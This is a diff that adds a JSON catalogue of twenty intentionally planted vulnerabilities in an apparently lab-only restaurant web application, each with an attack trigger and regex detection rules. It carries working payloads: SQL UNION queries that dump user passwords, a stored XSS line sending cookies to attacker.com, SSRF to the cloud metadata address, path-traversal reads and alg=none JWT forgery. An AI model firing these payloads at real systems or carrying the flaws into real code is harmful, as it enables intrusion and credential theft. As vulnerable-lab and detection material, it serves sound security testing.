@@ -1,0 +1,666 @@
+[
+  {
+    "id": "V01",
+    "type": "SQL Injection",
+    "cwe": "CWE-89",
+    "owasp": "A03:2021",
+    "endpoint": "GET /api/menu/{id}",
+    "param": "id (path)",
+    "trigger": "GET /api/menu/1 UNION SELECT 1,username,email,password,role,image_url,1 FROM users--",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Request URL contains SQL UNION or injection metacharacters",
+        "target": "request.url",
+        "pattern": "(?i)(union[\\s%+]+select|'\\s*or\\b|;\\s*drop|--|\\bxp_|information_schema)",
+        "heuristic_name": "sql_metachar_in_url"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response body contains email addresses (user table data leaked)",
+        "pattern": "[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,6}",
+        "heuristic_name": "email_in_response"
+      },
+      {
+        "strategy": "error_signature",
+        "description": "SQLite error message exposed in response body",
+        "pattern": "(?i)(sqlite|syntax error|no such column|SQLITE_ERROR|near \".{1,20}\")",
+        "heuristic_name": "db_error_leaked"
+      }
+    ],
+    "validation": "Response contains user credentials (email, password) mixed into menu item fields",
+    "severity": "Critical"
+  },
+  {
+    "id": "V02",
+    "type": "SQL Injection",
+    "cwe": "CWE-89",
+    "owasp": "A03:2021",
+    "endpoint": "GET /api/search",
+    "param": "q (query)",
+    "trigger": "GET /api/search?q=' UNION SELECT 1,username,email,password,category,image_url,1 FROM users--",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Search query parameter contains SQL injection metacharacters",
+        "target": "request.url",
+        "pattern": "(?i)(union[\\s%+]+select|'\\s*(or|and)\\b|;\\s*drop|--|0x[0-9a-f]+|\\bchar\\s*\\()",
+        "heuristic_name": "sql_metachar_in_search"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Search response leaks email addresses from users table",
+        "pattern": "[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,6}",
+        "heuristic_name": "email_in_search_response"
+      },
+      {
+        "strategy": "error_signature",
+        "description": "Database error string in search response indicates injection",
+        "pattern": "(?i)(sqlite|syntax error|no such column|SQLITE_ERROR|unrecognized token)",
+        "heuristic_name": "db_error_in_search"
+      }
+    ],
+    "validation": "Response contains rows with user data leaked through search results",
+    "severity": "Critical"
+  },
+  {
+    "id": "V03",
+    "type": "Stored XSS",
+    "cwe": "CWE-79",
+    "owasp": "A03:2021",
+    "endpoint": "POST /api/reviews",
+    "param": "comment (body)",
+    "trigger": "POST /api/reviews with comment: \"<script>document.location='http://attacker.com/?c='+document.cookie</script>\"",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Review comment contains HTML/script injection tags",
+        "target": "request.body",
+        "pattern": "(?i)(<script|<img[^>]+onerror|<svg[^>]+on\\w+|<iframe|javascript:|on\\w+\\s*=\\s*[\"']?[^\"'>]*[\"']?)",
+        "heuristic_name": "xss_payload_in_comment"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Stored XSS payload returned unescaped in reviews response",
+        "pattern": "(?i)(<script|onerror\\s*=|onload\\s*=|<img[^>]+onerror|javascript:)",
+        "heuristic_name": "unescaped_html_in_review_response"
+      }
+    ],
+    "validation": "Stored payload returned in GET /api/reviews response and rendered in browser DOM via innerHTML, causing script execution",
+    "severity": "High"
+  },
+  {
+    "id": "V04",
+    "type": "SSRF",
+    "cwe": "CWE-918",
+    "owasp": "A10:2021",
+    "endpoint": "POST /api/import-menu",
+    "param": "url (body JSON)",
+    "trigger": "POST /api/import-menu with {\"url\": \"http://169.254.169.254/latest/meta-data/\"}",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Import URL targets a private or metadata IP address",
+        "target": "request.body",
+        "pattern": "(?i)(169\\.254\\.|127\\.0\\.0\\.|10\\.\\d{1,3}\\.|192\\.168\\.|localhost|file://|dict://|gopher://|0\\.0\\.0\\.0)",
+        "heuristic_name": "ssrf_internal_url_in_body"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Response contains bytes_fetched field confirming outbound server request",
+        "fields": ["bytes_fetched"],
+        "heuristic_name": "ssrf_bytes_fetched_present"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response body contains cloud instance metadata keys",
+        "pattern": "(?i)(ami-id|instance-id|meta-data|iam/security-credentials|placement/region)",
+        "heuristic_name": "cloud_metadata_in_response"
+      }
+    ],
+    "validation": "Response contains bytes_fetched > 0, and content from internal/metadata service is returned",
+    "severity": "High"
+  },
+  {
+    "id": "V05",
+    "type": "IDOR / Broken Object Level Authorization",
+    "cwe": "CWE-639",
+    "owasp": "A01:2021",
+    "endpoint": "GET /api/orders/{id}",
+    "param": "id (path)",
+    "trigger": "Authenticated as user A (e.g., id=2), GET /api/orders/3 (belongs to user B id=3)",
+    "triggers": [
+      {
+        "strategy": "status_code",
+        "description": "Order endpoint returns 200 allowing cross-user access (no ownership check)",
+        "status_codes": [200],
+        "heuristic_name": "idor_order_200_response"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Response contains user_id field exposing that order belongs to different user",
+        "fields": ["user_id", "total", "status"],
+        "heuristic_name": "order_data_in_response"
+      }
+    ],
+    "validation": "Response returns order data with user_id !== requesting user's session ID",
+    "severity": "High"
+  },
+  {
+    "id": "V06",
+    "type": "IDOR / Broken Object Level Authorization",
+    "cwe": "CWE-639",
+    "owasp": "A01:2021",
+    "endpoint": "GET /api/user/profile",
+    "param": "id (query param)",
+    "trigger": "Authenticated as user id=2, GET /api/user/profile?id=1",
+    "triggers": [
+      {
+        "strategy": "field_presence",
+        "description": "Profile response exposes a password field for a different user",
+        "fields": ["password"],
+        "heuristic_name": "password_field_in_profile"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Profile response contains an email address for another user",
+        "pattern": "[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,6}",
+        "heuristic_name": "email_in_profile_response"
+      }
+    ],
+    "validation": "Response returns profile of user id=1 (admin) including password field",
+    "severity": "High"
+  },
+  {
+    "id": "V07",
+    "type": "Broken Authentication / Broken Function Level Authorization",
+    "cwe": "CWE-285",
+    "owasp": "A01:2021",
+    "endpoint": "GET /admin/orders, GET /admin/users",
+    "param": "X-Admin-Token (header)",
+    "trigger": "GET /admin/orders with header X-Admin-Token: lab-admin-bypass-token (unauthenticated, or any logged-in user without admin role)",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Request includes X-Admin-Token header with any value (hardcoded token bypass)",
+        "target": "request.headers",
+        "header_name": "X-Admin-Token",
+        "pattern": ".+",
+        "heuristic_name": "admin_token_header_present"
+      },
+      {
+        "strategy": "status_code",
+        "description": "Admin endpoint returns 200 without proper role verification",
+        "status_codes": [200],
+        "heuristic_name": "admin_route_200_response"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Admin users response includes password fields for all users",
+        "fields": ["password"],
+        "heuristic_name": "password_in_admin_response"
+      }
+    ],
+    "validation": "Response returns full order/user list including passwords without proper role verification",
+    "severity": "Critical"
+  },
+  {
+    "id": "V08",
+    "type": "Sensitive Data Exposure",
+    "cwe": "CWE-200",
+    "owasp": "A02:2021",
+    "endpoint": "GET /api/user/profile",
+    "param": "id (query param)",
+    "trigger": "GET /api/user/profile?id=1 (any authenticated user)",
+    "triggers": [
+      {
+        "strategy": "field_presence",
+        "description": "Response JSON contains a password field with plaintext value",
+        "fields": ["password"],
+        "heuristic_name": "plaintext_password_in_response"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response body contains what looks like a plaintext password value",
+        "pattern": "\"password\"\\s*:\\s*\"[^\"]{4,}\"",
+        "heuristic_name": "password_value_in_json"
+      }
+    ],
+    "validation": "JSON response contains password field with plaintext password",
+    "severity": "High"
+  },
+  {
+    "id": "V09",
+    "type": "Security Misconfiguration",
+    "cwe": "CWE-489",
+    "owasp": "A05:2021",
+    "endpoint": "GET /api/debug/info",
+    "param": "none",
+    "trigger": "GET /api/debug/info (no auth required)",
+    "triggers": [
+      {
+        "strategy": "field_presence",
+        "description": "Debug response exposes sensitive server internals: admin_token and session_key",
+        "fields": ["admin_token", "session_key"],
+        "heuristic_name": "secrets_in_debug_response"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response body contains recognisable hardcoded secret values",
+        "pattern": "(?i)(restaurant-admin|session[_-]key|admin[_-]token|db[_-]path)",
+        "heuristic_name": "hardcoded_secret_in_response"
+      },
+      {
+        "strategy": "status_code",
+        "description": "Debug endpoint accessible without authentication (200 on unauthenticated request)",
+        "status_codes": [200],
+        "heuristic_name": "debug_endpoint_open"
+      }
+    ],
+    "validation": "Response contains session_key, admin_token, db_path, version, and runtime internals in plaintext",
+    "severity": "Critical"
+  },
+  {
+    "id": "V10",
+    "type": "Mass Assignment",
+    "cwe": "CWE-915",
+    "owasp": "A04:2021",
+    "endpoint": "POST /register, POST /api/user/update",
+    "param": "role (body JSON or query param)",
+    "trigger": "POST /register?role=admin with {\"username\":\"hacker\",\"email\":\"h@h.com\",\"password\":\"pw\"}",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Registration URL contains role parameter set to a privileged value",
+        "target": "request.url",
+        "pattern": "(?i)\\brole\\s*=\\s*(admin|superuser|staff|root|moderator)",
+        "heuristic_name": "privileged_role_in_url"
+      },
+      {
+        "strategy": "pattern_match",
+        "description": "Request body includes a role field set to a privileged value",
+        "target": "request.body",
+        "pattern": "(?i)\"role\"\\s*:\\s*\"(admin|superuser|staff|root|moderator)\"",
+        "heuristic_name": "privileged_role_in_body"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Registration response confirms user was created (user_id present)",
+        "fields": ["user_id"],
+        "heuristic_name": "user_created_with_role"
+      }
+    ],
+    "validation": "New user is created with role=admin. Verified by fetching /api/user/profile?id=<new_id> and seeing role='admin'",
+    "severity": "Critical"
+  },
+  {
+    "id": "V11",
+    "type": "Broken Function Level Authorization",
+    "cwe": "CWE-285",
+    "owasp": "A01:2021",
+    "endpoint": "DELETE /api/menu/{id}",
+    "param": "id (path)",
+    "trigger": "Any authenticated non-admin user sends DELETE /api/menu/1",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Request uses DELETE method on a menu endpoint",
+        "target": "request.method",
+        "pattern": "^DELETE$",
+        "heuristic_name": "delete_method_on_menu"
+      },
+      {
+        "strategy": "status_code",
+        "description": "Delete endpoint returns 200 for a non-admin session (no role check)",
+        "status_codes": [200],
+        "heuristic_name": "delete_succeeds_as_non_admin"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response confirms item removal without admin authorisation",
+        "pattern": "(?i)item removed from menu",
+        "heuristic_name": "item_removed_confirmation"
+      }
+    ],
+    "validation": "Response is 200 with 'item removed from menu'. Menu item id=1 no longer appears in GET /api/menu",
+    "severity": "High"
+  },
+  {
+    "id": "V12",
+    "type": "CSRF",
+    "cwe": "CWE-352",
+    "owasp": "A01:2021",
+    "endpoint": "POST /api/orders",
+    "param": "none (no CSRF token expected)",
+    "trigger": "Cross-origin POST /api/orders with valid session cookie and Content-Type: application/json",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Request includes a cross-origin Origin header (simulating CSRF attack)",
+        "target": "request.headers",
+        "header_name": "Origin",
+        "pattern": "(?i)^https?://((([a-z0-9-]+\\.)+[a-z0-9-]{2,})|(([1-9]\\d?|1[01]\\d|12[0-6]|12[89]|1[3-9]\\d|2[0-4]\\d|25[0-5])\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)))(:\\d{1,5})?(/.*)?$",
+        "heuristic_name": "cross_origin_header_present"
+      },
+      {
+        "strategy": "status_code",
+        "description": "Order placed successfully despite cross-origin request (no CSRF token checked)",
+        "status_codes": [200, 201],
+        "heuristic_name": "csrf_order_accepted"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Response contains order_id confirming order was placed without CSRF token",
+        "fields": ["order_id"],
+        "heuristic_name": "order_created_without_csrf_token"
+      }
+    ],
+    "validation": "Order is placed successfully without any CSRF token validation",
+    "severity": "Medium"
+  },
+  {
+    "id": "V13",
+    "type": "Path Traversal",
+    "cwe": "CWE-22",
+    "owasp": "A01:2021",
+    "endpoint": "GET /api/files",
+    "param": "name (query param)",
+    "trigger": "GET /api/files?name=../../go.mod",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "File name parameter contains directory traversal sequences",
+        "target": "request.url",
+        "pattern": "(\\.\\./|\\.\\.(\\\\|%2[Ff]|%5[Cc])|%252[Ff]|%252e%252e)",
+        "heuristic_name": "path_traversal_in_url"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response contains Go module declaration (go.mod read outside uploads/)",
+        "pattern": "(?i)(module xvulnv2|^go \\d\\.\\d|require \\()",
+        "heuristic_name": "go_module_content_leaked"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response contains Unix/Linux system file content indicators",
+        "pattern": "(?i)(root:x:0:0|/bin/(sh|bash)|daemon:|nobody:)",
+        "heuristic_name": "system_file_content_leaked"
+      }
+    ],
+    "validation": "Response returns content of go.mod (or any readable file outside uploads/)",
+    "severity": "High"
+  },
+  {
+    "id": "V14",
+    "type": "Insecure Deserialization",
+    "cwe": "CWE-502",
+    "owasp": "A08:2021",
+    "endpoint": "POST /api/cart/restore",
+    "param": "cart_data (body JSON, base64-encoded)",
+    "trigger": "POST /api/cart/restore with cart_data: base64({\"items\":[{\"id\":1}],\"discount\":100,\"promo\":\"STAFFONLY\",\"total\":0})",
+    "triggers": [
+      {
+        "strategy": "field_presence",
+        "description": "Cart response echoes back attacker-controlled discount and promo fields without recalculation",
+        "fields": ["discount", "promo", "total"],
+        "heuristic_name": "client_controlled_cart_fields"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response contains staff-only promo code or manipulated zero total (trust of client data)",
+        "pattern": "(?i)(STAFFONLY|\"discount\":\\s*100|\"total\":\\s*0)",
+        "heuristic_name": "manipulated_cart_values_echoed"
+      }
+    ],
+    "validation": "Response echoes back the deserialized cart including attacker-controlled discount/total fields without server-side recalculation",
+    "severity": "Medium"
+  },
+  {
+    "id": "V15",
+    "category": "file_handling",
+    "type": "Unrestricted File Upload",
+    "cwe": "CWE-434",
+    "owasp": "A05:2021",
+    "endpoint": "POST /api/admin/menu/upload-image",
+    "param": "image (multipart file)",
+    "flow": "Admin menu image upload",
+    "feature_flag": "ENABLE_ADVANCED_VULNS",
+    "lab_only": true,
+    "detection_hints": [
+      "Upload a non-image extension such as .html or .svg",
+      "Confirm the response returns a public_url under /static/uploads/menus/",
+      "Fetch the uploaded asset directly to verify storage/exposure"
+    ],
+    "trigger": "POST /api/admin/menu/upload-image with multipart file named shell.svg or menu-admin.html",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Upload endpoint receives multipart file data",
+        "target": "request.headers",
+        "header_name": "Content-Type",
+        "pattern": "(?i)multipart/form-data",
+        "heuristic_name": "multipart_upload_detected"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Upload response returns the public URL of the stored asset",
+        "fields": ["public_url", "stored_path", "filename"],
+        "heuristic_name": "uploaded_asset_metadata_returned"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Uploaded asset is exposed from the public static uploads directory",
+        "pattern": "/static/uploads/menus/[^\"]+\\.(html|svg|js|php|txt|gif)",
+        "heuristic_name": "dangerous_upload_publicly_served"
+      }
+    ],
+    "validation": "Any uploaded file type is accepted, written under ./static/uploads/menus, and returned as a publicly fetchable URL",
+    "severity": "High"
+  },
+  {
+    "id": "V16",
+    "category": "api_business_logic",
+    "type": "API9: Improper Inventory Management",
+    "cwe": "CWE-840",
+    "owasp": "API9:2023",
+    "endpoint": "POST /api/kitchen/inventory/adjust",
+    "param": "delta / set_to (body JSON)",
+    "flow": "Kitchen stock adjustment API",
+    "feature_flag": "ENABLE_ADVANCED_VULNS",
+    "lab_only": true,
+    "detection_hints": [
+      "Use a staff token to set stock negative or to an unrealistic value",
+      "Observe that no approval workflow, range check, or warehouse validation exists",
+      "Read the updated stock back from /api/kitchen/inventory"
+    ],
+    "trigger": "POST /api/kitchen/inventory/adjust with {\"menu_item_id\":6,\"set_to\":-25,\"reason\":\"manual correction\"}",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Inventory adjustment request targets the kitchen stock API",
+        "target": "request.url",
+        "pattern": "/api/kitchen/inventory/adjust",
+        "heuristic_name": "inventory_adjust_endpoint_targeted"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Adjusted inventory response contains negative or extreme stock values",
+        "pattern": "\"stock\"\\s*:\\s*(-\\d+|[1-9]\\d{3,})",
+        "heuristic_name": "invalid_stock_value_accepted"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Inventory API echoes back updated stock and location without enforcement",
+        "fields": ["stock", "location", "updated_by"],
+        "heuristic_name": "inventory_business_fields_echoed"
+      }
+    ],
+    "validation": "The API accepts arbitrary direct stock rewrites, including negative values, without validation or workflow controls",
+    "severity": "High"
+  },
+  {
+    "id": "V17",
+    "category": "file_inclusion",
+    "type": "Local File Inclusion / Remote File Inclusion",
+    "cwe": "CWE-98",
+    "owasp": "A05:2021",
+    "endpoint": "GET /api/kitchen/recipes/view",
+    "param": "source (query param)",
+    "flow": "Kitchen recipe viewer",
+    "feature_flag": "ENABLE_ADVANCED_VULNS",
+    "lab_only": true,
+    "detection_hints": [
+      "Use ../../ paths to read local files outside ./recipes",
+      "Use http:// or https:// to make the server fetch a remote recipe template",
+      "Look for resolved_path, content, or remote fetch metadata in the response"
+    ],
+    "trigger": "GET /api/kitchen/recipes/view?source=../../go.mod or ?source=http://127.0.0.1:4443/api/debug/info",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Recipe source contains traversal sequences or remote URL schemes",
+        "target": "request.url",
+        "pattern": "(\\.\\./|https?://)",
+        "heuristic_name": "recipe_source_lfi_or_rfi_pattern"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Response exposes local resolved_path or remote fetch metadata",
+        "fields": ["resolved_path", "content_type", "content"],
+        "heuristic_name": "recipe_viewer_leakage_fields"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response body contains local file or internal service content",
+        "pattern": "(?i)(module xvulnv2|session_key|admin_token|root:x:0:0|package main)",
+        "heuristic_name": "local_or_remote_content_included"
+      }
+    ],
+    "validation": "The recipe viewer reads arbitrary local files via relative paths and fetches remote content directly when a URL is supplied",
+    "severity": "Critical"
+  },
+  {
+    "id": "V18",
+    "category": "protocol_handling",
+    "type": "HTTP Request Smuggling",
+    "cwe": "CWE-444",
+    "owasp": "A05:2021",
+    "endpoint": "POST /api/kitchen/dispatch",
+    "param": "Transfer-Encoding / Content-Length headers",
+    "flow": "Kitchen dispatch proxy simulation",
+    "feature_flag": "ENABLE_ADVANCED_VULNS",
+    "lab_only": true,
+    "detection_hints": [
+      "Send both Content-Length and Transfer-Encoding: chunked headers",
+      "Embed a second HTTP request after 0\\r\\n\\r\\n in the request body",
+      "Look for desync, smuggled_request, and interpretation mismatch fields in the response"
+    ],
+    "trigger": "POST /api/kitchen/dispatch with both Content-Length and Transfer-Encoding: chunked plus a second request after 0\\r\\n\\r\\n",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Request contains both TE and CL headers, indicating a parser desynchronisation attempt",
+        "target": "request.headers",
+        "pattern": "(?is)Content-Length:.*Transfer-Encoding|Transfer-Encoding:.*Content-Length",
+        "heuristic_name": "te_cl_header_conflict"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Dispatch response reports a desync and parsed smuggled request metadata",
+        "fields": ["desync", "smuggled_request", "frontend_interpretation", "backend_interpretation"],
+        "heuristic_name": "smuggling_simulation_response_fields"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response explicitly shows frontend/backend interpretation mismatch",
+        "pattern": "(?i)(content_length|transfer_encoding|smuggled_response_preview)",
+        "heuristic_name": "parser_mismatch_reported"
+      }
+    ],
+    "validation": "When both TE and CL are supplied, the dispatch handler simulates a frontend/backend parsing mismatch and exposes the smuggled internal request target",
+    "severity": "High"
+  },
+  {
+    "id": "V19",
+    "category": "filesystem",
+    "type": "Insecure Temporary File Usage",
+    "cwe": "CWE-377",
+    "owasp": "A05:2021",
+    "endpoint": "GET /api/orders/{id}/invoice/export",
+    "param": "id (path)",
+    "flow": "Order invoice export",
+    "feature_flag": "ENABLE_ADVANCED_VULNS",
+    "lab_only": true,
+    "detection_hints": [
+      "Export an invoice and inspect the returned temp_path/public_url",
+      "Guess another order's invoice filename under /static/exports/tmp/",
+      "Confirm the file persists until manual cleanup"
+    ],
+    "trigger": "GET /api/orders/1/invoice/export as the owning user",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Invoice export route is invoked",
+        "target": "request.url",
+        "pattern": "/api/orders/\\d+/invoice/export",
+        "heuristic_name": "invoice_export_route_hit"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Export response returns predictable temporary file metadata",
+        "fields": ["temp_path", "public_url", "expires"],
+        "heuristic_name": "temporary_invoice_metadata_exposed"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Temporary invoice is exposed under a public static path",
+        "pattern": "/static/exports/tmp/invoice-order-\\d+\\.json",
+        "heuristic_name": "predictable_public_invoice_url"
+      }
+    ],
+    "validation": "Invoice exports are written to a predictable public static directory with no automatic cleanup, making temporary files guessable and accessible",
+    "severity": "High"
+  },
+  {
+    "id": "V20",
+    "category": "authentication",
+    "type": "JWT Validation Flaws",
+    "cwe": "CWE-347",
+    "owasp": "A07:2021",
+    "endpoint": "POST /api/staff/session, GET /api/staff/panel",
+    "param": "Authorization: Bearer <JWT>",
+    "flow": "Staff/admin JWT session",
+    "feature_flag": "ENABLE_ADVANCED_VULNS",
+    "lab_only": true,
+    "detection_hints": [
+      "Forge a token with alg=none and role=admin",
+      "Reuse an expired token; exp is ignored by the panel endpoints",
+      "Modify the JWT role claim and sign with the weak hardcoded secret"
+    ],
+    "trigger": "GET /api/staff/panel with a forged JWT containing role=admin and alg=none",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Staff panel request carries a bearer token",
+        "target": "request.headers",
+        "header_name": "Authorization",
+        "pattern": "(?i)^Bearer\\s+[A-Za-z0-9_\\-.]+$",
+        "heuristic_name": "bearer_token_present"
+      },
+      {
+        "strategy": "status_code",
+        "description": "Staff panel still returns success for a forged or expired token",
+        "status_codes": [200],
+        "heuristic_name": "forged_staff_token_accepted"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Panel response exposes authenticated role and inventory data",
+        "fields": ["auth", "inventory"],
+        "heuristic_name": "staff_panel_data_returned"
+      }
+    ],
+    "validation": "The staff panel accepts alg=none tokens, uses a weak hardcoded signing secret, and does not validate expiration or issuer claims",
+    "severity": "Critical"
+  }
+]
